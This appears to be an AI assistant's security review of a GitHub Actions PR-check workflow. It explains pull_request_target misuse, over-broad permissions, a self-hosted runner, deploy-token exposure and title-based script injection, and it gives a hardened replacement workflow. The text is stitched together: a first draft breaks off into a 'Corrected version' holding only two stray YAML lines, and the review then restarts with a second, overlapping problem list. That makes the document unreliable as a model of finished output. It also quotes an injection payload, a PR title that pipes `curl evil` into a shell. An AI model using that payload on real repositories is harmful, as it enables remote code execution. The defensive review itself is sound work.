## Problems in `pr-check.yml`

1. **`pull_request_target` with a checkout of the PR head SHA.** This is the main problem. The job runs fork-controlled code (`npm ci` runs install scripts, and `check.sh` and `package.json` come from the PR) in a context that has secrets and a write token. Anyone can open a PR and run arbitrary code with your privileges.
2. **`permissions: write-all`.** A compromised job could push code, edit releases and so on.
3. **`runs-on: self-hosted` on a public repo.** Fork code can persistently compromise the runner and your network. Public PR code should only run on GitHub-hosted runners.
4. **`DEPLOY_TOKEN` is exposed to the test step.** A PR check has no need for a deploy secret, and the fork's code could read it.
5. **Script injection.** `${{ github.event.pull_request.title }}` is interpolated directly into `run:`. A PR title like `"; curl evil | sh #` becomes code.
6. **The "Checks passed." comment.** It needs write access, which fork PRs shouldn't have. It is also redundant, because the check's own status already reports pass or fail. It also posts even if you later reorder steps. `github-script@v7` is a moving tag, unlike your other SHA-pinned actions.
7. **Smaller issues.** The checkout keeps credentials persisted, and nothing limits job runtime. Nothing cancels superseded runs either.

## Corrected version

  pull_request:

    timeout-minutes: 15

The workflow has several serious problems. They combine into a way for any fork PR to take over your repo and runner.

## Problems

1. **`pull_request_target` combined with checking out the PR head SHA.** This is the main problem. `pull_request_target` runs with the base repo's secrets and a write token. The workflow then checks out and runs the fork's code (`npm ci` runs install scripts, and `check.sh` and `package.json` are attacker-controlled). Anyone who opens a PR can run arbitrary code with your secrets.
2. **`permissions: write-all`.** A compromised job gets full write access to the repo.
3. **`DEPLOY_TOKEN` exposed to untrusted code.** A PR check doesn't need a deploy secret, and the fork's code can read it from the environment.
4. **`runs-on: self-hosted` on a public repo.** Fork PRs can run code on your own machine, which can persist between jobs and reach your network. Use GitHub-hosted runners for untrusted code.
5. **Script injection in `Announce`.** `${{ github.event.pull_request.title }}` is interpolated straight into the shell script. A title like `"; curl evil | sh #` runs as a command.
6. **Smaller issues:**
   - `actions/github-script@v7` is pinned to a mutable tag, while checkout is pinned to a SHA.
   - Checkout persists credentials by default.
   - There's no `concurrency` group and no timeout.
   - The trigger types omit `reopened`.

## Corrected version

```yaml
name: PR check

on:
  pull_request:
    types: [opened, synchronize, reopened]

permissions:
  contents: read

concurrency:
  group: pr-check-${{ github.event.pull_request.number }}
  cancel-in-progress: true

jobs:
  check:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      - uses: actions/checkout@3df4ab11eba7bda6032a0b82a6bb43b11571feac # v4.0.0
        with:
          persist-credentials: false

      - name: Announce
        env:
          PR_TITLE: ${{ github.event.pull_request.title }}
        run: echo "Checking PR: $PR_TITLE"

      - name: Install and test
        run: |
          npm ci
          ./scripts/check.sh
```

## What changed and what to know

- **Trigger:** `pull_request` runs the PR's code with a read-only token and no secrets for forks. This is the safe trigger for running untrusted code.
- **Secrets:** I removed `DEPLOY_TOKEN`. If a step really needs a secret, run it only from a trusted trigger such as `push` to `main` or `release.yml`, never on PR code.
- **Permissions:** the workflow now has least-privilege `contents: read`.
- **Title:** it's passed through an env var, so the shell never parses it as code.
- **"Checks passed" comment:** I removed it. On fork PRs the `pull_request` token can't write comments, so it would fail. The green check on the PR already reports this. If you want the comment, use the two-workflow pattern:
  1. This workflow uploads a tiny artifact, such as a result flag.
  2. A separate `workflow_run` workflow, which never checks out or runs PR code, posts the comment. It should treat the artifact as untrusted data.
- **Pinning:** if you keep `github-script` or add other actions, pin them to full commit SHAs like checkout. I didn't look up a SHA for you.

I only reviewed `pr-check.yml`, `check.sh` and `package.json`. I didn't open `release.yml`. It's worth checking that it doesn't use the same patterns, and that `DEPLOY_TOKEN` is scoped to a protected environment. I also haven't written the corrected version to disk.
